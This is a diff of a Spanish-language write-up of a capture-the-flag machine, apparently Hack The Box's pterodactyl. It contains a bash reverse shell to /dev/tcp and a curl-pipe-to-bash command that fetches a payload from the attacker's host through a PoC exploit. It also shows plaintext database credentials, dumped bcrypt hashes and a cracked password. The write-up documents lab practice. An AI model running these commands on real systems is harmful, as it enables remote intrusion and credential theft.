@@ -38,10 +38,13 @@ sh -i >& /dev/tcp/10.10.15.111/443 0>&1
 ```
 
 Nos abriremos un servidor con python `python3 -m http.server 8080`
-Y nos ponemos en escucha con penelope ``
+Y nos ponemos en escucha con penelope `penelope -p 8080`
 
+y ejecutamos el `poc.py` con  `python3 poc.py panel.pterodactyl.htb 'curl http://10.10.15.111:8080/onelines.sh | bash'`
 
-`python3 poc.py panel.pterodactyl.htb 'curl http://10.10.15.111:8080/onelines.sh | bash'`
+Obteniendo asi una reverse shell
+
+Accedemos al mariadb que esta abierto que hemos visto con el CVE anterior
 
 mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1
 
@@ -50,6 +53,8 @@ select * from users
 headmonitor::$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
 phileasfogg3::$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
 
+Lo crackeamos con jhon
+phileasfogg3::!QAZ2wsx
 
 
 
